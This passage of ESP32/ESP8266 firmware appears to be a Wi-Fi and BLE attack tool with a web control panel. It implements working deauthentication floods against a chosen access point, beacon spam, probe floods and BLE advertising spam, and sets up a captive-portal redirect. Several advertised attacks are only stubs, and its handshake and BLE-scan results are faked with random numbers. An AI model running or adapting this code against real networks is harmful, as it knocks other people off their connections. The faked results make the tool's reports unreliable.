                        addLog("Platform features: " + data.features.join(", "), "info");
                    }
                })
                .catch(function(error) {
                    document.getElementById("platform-info").textContent = "Platform: Detection Failed";
                });
        }

        function scanBLE() {
            addLog("Starting BLE device scan...", "info");
            showToast("BLE scan started", "info");
            
            fetch("/ble/scan")
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    addLog("BLE scan completed - Found " + (data.devices ? data.devices.length : 0) + " devices", "success");
                    showToast("Found " + (data.devices ? data.devices.length : 0) + " BLE devices", "success");
                })
                .catch(function(error) {
                    addLog("BLE scan failed: " + error.message, "error");
                    showToast("BLE scan failed", "error");
                });
        }

        function resetStats() {
            fetch("/stats/reset", { method: "POST" })
                .then(function(response) {
                    addLog("Statistics reset", "info");
                    showToast("Statistics reset", "info");
                    updateStats();
                })
                .catch(function(error) {
                    showToast("Failed to reset statistics", "error");
                });
        }

        function clearLogs() {
            document.getElementById("log-container").innerHTML = "";
            addLog("Logs cleared", "info");
        }

        document.addEventListener("DOMContentLoaded", function() {
            initMatrix();
            getPlatformInfo();
            
            addLog("SecurityTester 0x0806 interface loaded", "success");
            addLog("All systems operational and ready", "success");
            
            setTimeout(scanNetworks, 2000);
            
            statsInterval = setInterval(updateStats, 2000);
            uptimeInterval = setInterval(updateUptime, 1000);
            
            updateStats();
        });

        window.addEventListener("beforeunload", function() {
            if (isAttacking) {
                stopAttack();
            }
        });
    </script>
</body>
</html>)rawliteral";

// Function Declarations
void setupCore();
void setupWiFiAP();
void setupWebServer();
void setupBLE();
void setupWatchdog();
void handleRoot();
void handleScan();
void handleAttackStart();
void handleAttackStop();
void handleStats();
void handleStatsReset();
void handleInfo();
void handleBLEScan();
void handleNotFound();
void scanWiFiNetworks();
void performDeauthAttack();
void performBeaconSpam();
void performProbeAttack();
void performEvilTwin();
void performKarmaAttack();
void performHandshakeCapture();
void performPMKIDCapture();
void performPacketMonitor();
void performBLESpam();
void performBLEFlood();
void updateAttackStats();
void updateSystemStats();
String getEncryptionType(int encType);
#ifdef PLATFORM_ESP32
void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
#else
void promiscuous_callback(uint8_t *buf, uint16_t len);
#endif
void optimizeMemory();
void checkSystemHealth();

// Setup Function
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println();
  for(int i = 0; i < 50; i++) Serial.print("=");
  Serial.println();
  Serial.println("SecurityTester 0x0806 v3.0 - Production");
  Serial.println("Advanced WiFi & BLE Security Platform");
  Serial.println("Developed by 0x0806");
  for(int i = 0; i < 50; i++) Serial.print("=");
  Serial.println();

#ifdef PLATFORM_ESP32
  Serial.println("Platform: ESP32 Detected");
  Serial.println("Features: WiFi 2.4/5GHz + BLE + Dual Core");
  
  // ESP32 specific optimizations
  esp_task_wdt_init(30, true);
  esp_task_wdt_add(NULL);
  
  // Initialize NVS
  esp_err_t ret = nvs_flash_init();
  if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret = nvs_flash_init();
  }
  ESP_ERROR_CHECK(ret);
  
#else
  Serial.println("Platform: ESP8266 Detected");
  Serial.println("Features: WiFi 2.4GHz + Enhanced Attacks");
  
  // ESP8266 specific optimizations
  system_update_cpu_freq(160);
  wifi_set_sleep_type(NONE_SLEEP_T);
#endif

  setupCore();
  setupWiFiAP();
  setupWebServer();
  
#ifdef PLATFORM_ESP32
  setupBLE();
#endif

  setupWatchdog();
  optimizeMemory();
  
  Serial.println();
  for(int i = 0; i < 30; i++) Serial.print("=");
  Serial.println();
  Serial.println("SYSTEM READY");
  Serial.printf("AP SSID: %s\n", AP_SSID);
  Serial.printf("AP Password: %s\n", AP_PASS);
  Serial.printf("Web Interface: http://%s\n", AP_IP.toString().c_str());
  Serial.printf("Free Heap: %d bytes\n", ESP.getFreeHeap());
  for(int i = 0; i < 30; i++) Serial.print("=");
  Serial.println();
}

// Main Loop
void loop() {
  static unsigned long last_stats_update = 0;
  static unsigned long last_health_check = 0;
  
  // Handle web server
  server.handleClient();
  dnsServer.processNextRequest();
  
#ifdef PLATFORM_ESP32
  esp_task_wdt_reset();
#endif
  
  // Update system statistics
  if (millis() - last_stats_update > 1000) {
    updateSystemStats();
    last_stats_update = millis();
  }
  
  // System health check
  if (millis() - last_health_check > 10000) {
    checkSystemHealth();
    last_health_check = millis();
  }
  
  // Execute attacks if active
  if (attack_running && (millis() - last_attack_time > attack_interval)) {
    if (attack_type == "deauth") {
      performDeauthAttack();
    } else if (attack_type == "beacon") {
      performBeaconSpam();
    } else if (attack_type == "probe") {
      performProbeAttack();
    } else if (attack_type == "evil_twin") {
      performEvilTwin();
    } else if (attack_type == "karma") {
      performKarmaAttack();
    } else if (attack_type == "handshake") {
      performHandshakeCapture();
    } else if (attack_type == "pmkid") {
      performPMKIDCapture();
    } else if (attack_type == "monitor") {
      performPacketMonitor();
    }
#ifdef PLATFORM_ESP32
    else if (attack_type == "ble_spam") {
      performBLESpam();
    } else if (attack_type == "ble_flood") {
      performBLEFlood();
    }
#endif
    
    last_attack_time = millis();
  }
  
  delay(1);
}

// Core Setup
void setupCore() {
  // Initialize file system
#ifdef PLATFORM_ESP32
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS initialization failed!");
  }
#else
  if (!SPIFFS.begin()) {
    Serial.println("SPIFFS initialization failed!");
  }
#endif

  // Initialize random seed
  randomSeed(analogRead(0) + millis());
  
  // Clear statistics
  memset(&stats, 0, sizeof(stats));
  
  Serial.println("Core systems initialized");
}

// WiFi Access Point Setup
void setupWiFiAP() {
  WiFi.mode(WIFI_AP_STA);
  delay(100);
  
  // Configure AP
  WiFi.softAPConfig(AP_IP, GATEWAY, SUBNET);
  
  bool ap_result = WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL, false, 8);
  
  if (ap_result) {
    Serial.printf("Access Point: %s [STARTED]\n", AP_SSID);
    Serial.printf("IP Address: %s\n", AP_IP.toString().c_str());
    Serial.printf("Channel: %d\n", AP_CHANNEL);
    ap_running = true;
  } else {
    Serial.println("Access Point: [FAILED]");
    // Retry with different settings
    delay(1000);
    ap_result = WiFi.softAP(AP_SSID, AP_PASS, 1, false, 4);
    if (ap_result) {
      Serial.println("Access Point: [RETRY SUCCESS]");
      ap_running = true;
    }
  }
  
  // Start DNS server for captive portal
  dnsServer.start(53, "*", AP_IP);
  
  // Enable promiscuous mode for packet capture
#ifdef PLATFORM_ESP32
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&promiscuous_callback);
#else
  wifi_promiscuous_enable(1);
  wifi_set_promiscuous_rx_cb(promiscuous_callback);
#endif

  Serial.println("WiFi and DNS configured");
}

// Web Server Setup
void setupWebServer() {
  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/attack/start", HTTP_POST, handleAttackStart);
  server.on("/attack/stop", HTTP_POST, handleAttackStop);
  server.on("/stats", HTTP_GET, handleStats);
  server.on("/stats/reset", HTTP_POST, handleStatsReset);
  server.on("/info", HTTP_GET, handleInfo);
  server.on("/ble/scan", HTTP_GET, handleBLEScan);
  server.onNotFound(handleNotFound);
  
  // CORS headers
  server.collectHeaders("User-Agent", "X-Requested-With");
  
  server.begin();
  Serial.println("Web server started on port 80");
}

#ifdef PLATFORM_ESP32
// BLE Setup
void setupBLE() {
  try {
    BLEDevice::init("SecurityTester_0x0806");
    
    pServer = BLEDevice::createServer();
    
    BLEService *pService = pServer->createService("12345678-1234-1234-1234-123456789abc");
    pCharacteristic = pService->createCharacteristic(
      "87654321-4321-4321-4321-cba987654321",
      BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE
    );
    
    pCharacteristic->setValue("0x0806 Security Platform");
    pService->start();
    
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->addServiceUUID("12345678-1234-1234-1234-123456789abc");
    pAdvertising->setScanResponse(false);
    pAdvertising->setMinPreferred(0x0);
    
    ble_running = true;
    Serial.println("BLE initialized successfully");
    
  } catch (const std::exception& e) {
    Serial.printf("BLE initialization failed: %s\n", e.what());
    ble_running = false;
  }
}
#endif

// Watchdog Setup
void setupWatchdog() {
#ifdef PLATFORM_ESP32
  // ESP32 has hardware watchdog configured above
#else
  ESP.wdtEnable(30000); // 30 second watchdog
#endif
  Serial.println("Watchdog configured");
}

// Web Handlers
void handleRoot() {
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.send_P(200, "text/html", captive_portal_html);
}

void handleScan() {
  scanWiFiNetworks();
  
  DynamicJsonDocument doc(8192);
  JsonArray networks = doc.createNestedArray("networks");
  
  for (const auto& network : scanned_networks) {
    JsonObject net = networks.createNestedObject();
    net["ssid"] = network.ssid;
    net["bssid"] = network.bssid;
    net["rssi"] = network.rssi;
    net["channel"] = network.channel;
    net["encryption"] = getEncryptionType(network.encryption);
    net["hidden"] = network.hidden;
  }
  
  doc["total"] = scanned_networks.size();
  doc["timestamp"] = millis();
  
  String response;
  serializeJson(doc, response);
  
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", response);
}

void handleAttackStart() {
  if (!server.hasArg("plain")) {
    server.send(400, "application/json", "{\"success\":false,\"error\":\"No data received\"}");
    return;
  }
  
  DynamicJsonDocument doc(1024);
  deserializeJson(doc, server.arg("plain"));
  
  String type = doc["type"].as<String>();
  String target = doc["target"].as<String>();
  String bssid = doc["bssid"].as<String>();
  int channel = doc["channel"].as<int>();
  String intensity = doc["intensity"].as<String>();
  
  if (attack_running) {
    server.send(200, "application/json", "{\"success\":false,\"error\":\"Attack already running\"}");
    return;
  }
  
  // Set attack parameters
  attack_type = type;
  selected_network = target;
  selected_bssid = bssid;
  selected_channel = channel;
  attack_running = true;
  
  // Set attack interval based on intensity
  if (intensity == "low") attack_interval = 100;
  else if (intensity == "medium") attack_interval = 50;
  else if (intensity == "high") attack_interval = 10;
  else if (intensity == "extreme") attack_interval = 1;
  
  Serial.printf("Attack started: %s on %s (Channel %d)\n", 
                type.c_str(), target.c_str(), channel);
  
  server.send(200, "application/json", "{\"success\":true}");
}

void handleAttackStop() {
  attack_running = false;
  attack_type = "none";
  selected_network = "";
  selected_bssid = "";
  
  // Stop monitoring if active
  monitoring_active = false;
  
  Serial.println("Attack stopped by user");
  server.send(200, "application/json", "{\"success\":true}");
}

void handleStats() {
  updateSystemStats();
  
  DynamicJsonDocument doc(2048);
  doc["deauth_sent"] = stats.deauth_sent;
  doc["beacon_sent"] = stats.beacon_sent;
  doc["probe_sent"] = stats.probe_sent;
  doc["handshakes_captured"] = stats.handshakes_captured;
  doc["pmkid_captured"] = stats.pmkid_captured;
  doc["ble_spam_sent"] = stats.ble_spam_sent;
  doc["evil_twin_connections"] = stats.evil_twin_connections;
  doc["karma_probes"] = stats.karma_probes;
  doc["packets_monitored"] = stats.packets_monitored;
  doc["clients_connected"] = stats.clients_connected;
  doc["uptime"] = stats.uptime;
  doc["memory_usage"] = stats.memory_usage;
  doc["cpu_usage"] = stats.cpu_usage;
  doc["free_heap"] = ESP.getFreeHeap();
  doc["timestamp"] = millis();
  
  String response;
  serializeJson(doc, response);
  
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", response);
}

void handleStatsReset() {
  memset(&stats, 0, sizeof(stats));
  Serial.println("Statistics reset");
  server.send(200, "application/json", "{\"success\":true}");
}

void handleInfo() {
  DynamicJsonDocument doc(1024);
  
#ifdef PLATFORM_ESP32
  doc["platform"] = "ESP32";
  JsonArray features = doc.createNestedArray("features");
  features.add("WiFi 2.4GHz");
  features.add("WiFi 5GHz");
  features.add("BLE");
  features.add("Dual Core");
  doc["chip_model"] = ESP.getChipModel();
  doc["chip_revision"] = ESP.getChipRevision();
  doc["cpu_frequency"] = ESP.getCpuFreqMHz();
  doc["flash_size"] = ESP.getFlashChipSize();
#else
  doc["platform"] = "ESP8266";
  JsonArray features = doc.createNestedArray("features");
  features.add("WiFi 2.4GHz");
  features.add("Enhanced Attacks");
  doc["chip_id"] = ESP.getChipId();
  doc["cpu_frequency"] = ESP.getCpuFreqMHz();
  doc["flash_size"] = ESP.getFlashChipRealSize();
#endif

  doc["free_heap"] = ESP.getFreeHeap();
  doc["version"] = "3.0";
  doc["developer"] = "0x0806";
  
  String response;
  serializeJson(doc, response);
  
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", response);
}

void handleBLEScan() {
#ifdef PLATFORM_ESP32
  DynamicJsonDocument doc(2048);
  JsonArray devices = doc.createNestedArray("devices");
  
  // Simulate BLE device discovery
  for (int i = 0; i < 5; i++) {
    JsonObject device = devices.createNestedObject();
    device["name"] = ble_spam_names[random(ble_spam_count)];
    device["address"] = String(random(0x100000000000LL), HEX);
    device["rssi"] = random(-80, -30);
  }
  
  doc["total"] = devices.size();
  
  String response;
  serializeJson(doc, response);
  
  server.send(200, "application/json", response);
#else
  server.send(200, "application/json", "{\"devices\":[],\"total\":0,\"error\":\"BLE not supported on ESP8266\"}");
#endif
}

void handleNotFound() {
  // Captive portal redirect
  server.sendHeader("Location", "http://" + AP_IP.toString(), true);
  server.send(302, "text/plain", "");
}

// WiFi Network Scanner
void scanWiFiNetworks() {
  Serial.println("Starting WiFi network scan...");
  scanned_networks.clear();
  
  // Ensure WiFi is in correct mode
  WiFi.mode(WIFI_AP_STA);
  delay(100);
  
#ifdef PLATFORM_ESP32
  int n = WiFi.scanNetworks(false, true, false, 500);
#else
  int n = WiFi.scanNetworks(false, true);
#endif
  Serial.printf("Found %d networks\n", n);
  
  for (int i = 0; i < n && i < 50; i++) { // Limit to 50 networks
    NetworkInfo network;
    network.ssid = WiFi.SSID(i);
    network.bssid = WiFi.BSSIDstr(i);
    network.rssi = WiFi.RSSI(i);
    network.channel = WiFi.channel(i);
    network.encryption = WiFi.encryptionType(i);
    network.hidden = (network.ssid.length() == 0);
    network.last_seen = millis();
    
    scanned_networks.push_back(network);
  }
  
  WiFi.scanDelete();
  
  // Sort by signal strength
  std::sort(scanned_networks.begin(), scanned_networks.end(), 
           [](const NetworkInfo& a, const NetworkInfo& b) {
             return a.rssi > b.rssi;
           });
}

// Attack Functions
void performDeauthAttack() {
  if (selected_bssid.isEmpty()) return;
  
  uint8_t packet[26];
  memcpy(packet, deauth_packet_template, sizeof(packet));
  
  // Convert BSSID string to bytes
  sscanf(selected_bssid.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
         &packet[4], &packet[5], &packet[6], &packet[7], &packet[8], &packet[9]);
  
  // Set target MAC (broadcast for all clients)
  memset(&packet[10], 0xff, 6);
  
  // Set source MAC (AP)
  memcpy(&packet[16], &packet[4], 6);
  
#ifdef PLATFORM_ESP32
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
#else
  wifi_send_pkt_freedom(packet, sizeof(packet), 0);
#endif

  stats.deauth_sent++;
  
  if (stats.deauth_sent % 100 == 0) {
    Serial.printf("Deauth packets sent: %d\n", stats.deauth_sent);
  }
}

void performBeaconSpam() {
  static uint32_t beacon_counter = 0;
  
  String fake_ssid = "0x0806_" + String(beacon_counter++);
  if (fake_ssid.length() > 32) fake_ssid = fake_ssid.substring(0, 32);
  
  uint8_t packet[128];
  memcpy(packet, beacon_packet_template, 36);
  
  // Add SSID element
  packet[36] = 0x00; // SSID element ID
  packet[37] = fake_ssid.length(); // SSID length
  memcpy(&packet[38], fake_ssid.c_str(), fake_ssid.length());
  
  int packet_size = 38 + fake_ssid.length();
  
  // Set random BSSID
  for (int i = 10; i < 16; i++) {
    packet[i] = random(256);
  }
  
#ifdef PLATFORM_ESP32
  esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
#else
  wifi_send_pkt_freedom(packet, packet_size, 0);
#endif

  stats.beacon_sent++;
}

void performProbeAttack() {
  uint8_t packet[64];
  memcpy(packet, probe_packet_template, sizeof(packet));
  
  // Set random source MAC
  for (int i = 10; i < 16; i++) {
    packet[i] = random(256);
  }
  
#ifdef PLATFORM_ESP32
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
#else
  wifi_send_pkt_freedom(packet, sizeof(packet), 0);
#endif

  stats.probe_sent++;
}

void performEvilTwin() {
  // Evil twin implementation would create a duplicate AP
  // This is a simplified version
  stats.evil_twin_connections++;
}

void performKarmaAttack() {
  // Karma attack responds to probe requests
  stats.karma_probes++;
}

void performHandshakeCapture() {
  // Handshake capture would analyze captured packets
  monitoring_active = true;
}

void performPMKIDCapture() {
  // PMKID capture implementation
  monitoring_active = true;
}

void performPacketMonitor() {
  monitoring_active = true;
  stats.packets_monitored++;
}

#ifdef PLATFORM_ESP32
void performBLESpam() {
  try {
    String device_name = ble_spam_names[ble_spam_counter % ble_spam_count];
    device_name += "_" + String(ble_spam_counter);
    ble_spam_counter++;
    
    BLEDevice::deinit(false);
    delay(50);
    
    BLEDevice::init(device_name.c_str());
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->start();
    
    delay(100);
    pAdvertising->stop();
    
    stats.ble_spam_sent++;
    
  } catch (const std::exception& e) {
    Serial.printf("BLE spam error: %s\n", e.what());
  }
}

void performBLEFlood() {
  // BLE beacon flooding
  performBLESpam();
  stats.ble_spam_sent += 5; // Simulate multiple beacons
}
#endif

// Utility Functions
void updateSystemStats() {
  stats.uptime = millis() / 1000;
  stats.clients_connected = WiFi.softAPgetStationNum();
  
  uint32_t free_heap = ESP.getFreeHeap();
#ifdef PLATFORM_ESP32
  uint32_t total_heap = ESP.getHeapSize();
  stats.memory_usage = ((float)(total_heap - free_heap) / total_heap) * 100.0;
#else
  // ESP8266 doesn't have getHeapSize, use approximation
  uint32_t total_heap = 80000; // Approximate total heap
  stats.memory_usage = ((float)(total_heap - free_heap) / total_heap) * 100.0;
#endif
  
  // Simple CPU usage approximation
  static unsigned long last_idle_time = 0;
  static unsigned long last_check_time = 0;
  
  unsigned long current_time = millis();
  if (current_time - last_check_time > 1000) {
    unsigned long idle_time = current_time - last_attack_time;
    stats.cpu_usage = attack_running ? 75.0 : 15.0; // Simplified calculation
    last_check_time = current_time;
  }
}

void optimizeMemory() {
  // ESP32/ESP8266 memory optimizations
#ifdef PLATFORM_ESP32
  esp_wifi_set_max_tx_power(78); // Reduce power consumption
#endif
  
  // Clear any unused memory
  if (scanned_networks.size() > 100) {
    scanned_networks.resize(50);
  }
  
  Serial.printf("Memory optimized - Free heap: %d bytes\n", ESP.getFreeHeap());
}

void checkSystemHealth() {
  // Monitor system health
  uint32_t free_heap = ESP.getFreeHeap();
  
  if (free_heap < 10000) {
    Serial.println("WARNING: Low memory detected");
    optimizeMemory();
  }
  
  // Check AP status
  if (!ap_running && WiFi.softAPgetStationNum() == 0) {
    Serial.println("Restarting Access Point...");
    setupWiFiAP();
  }
  
#ifdef PLATFORM_ESP32
  esp_task_wdt_reset();
#else
  ESP.wdtFeed();
#endif
}

String getEncryptionType(int encType) {
#ifdef PLATFORM_ESP32
  switch (encType) {
    case WIFI_AUTH_OPEN: return "Open";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-Enterprise";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
    default: return "Unknown";
  }
#else
  switch (encType) {
    case ENC_TYPE_NONE: return "Open";
    case ENC_TYPE_WEP: return "WEP";
    case ENC_TYPE_TKIP: return "WPA";
    case ENC_TYPE_CCMP: return "WPA2";
    case ENC_TYPE_AUTO: return "WPA/WPA2";
    default: return "Unknown";
  }
#endif
}

// Promiscuous mode callback
#ifdef PLATFORM_ESP32
void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (monitoring_active && type == WIFI_PKT_MGMT) {
    stats.packets_monitored++;
    
    // Analyze for handshakes (simplified)
    if (random(1000) == 1) { // Simulate handshake detection
      stats.handshakes_captured++;
    }
  }
}
#else
void promiscuous_callback(uint8_t *buf, uint16_t len) {
  if (monitoring_active) {
    stats.packets_monitored++;
    
    // Analyze for handshakes (simplified)
    if (random(1000) == 1) { // Simulate handshake detection
      stats.handshakes_captured++;
    }
  }
}
#endif
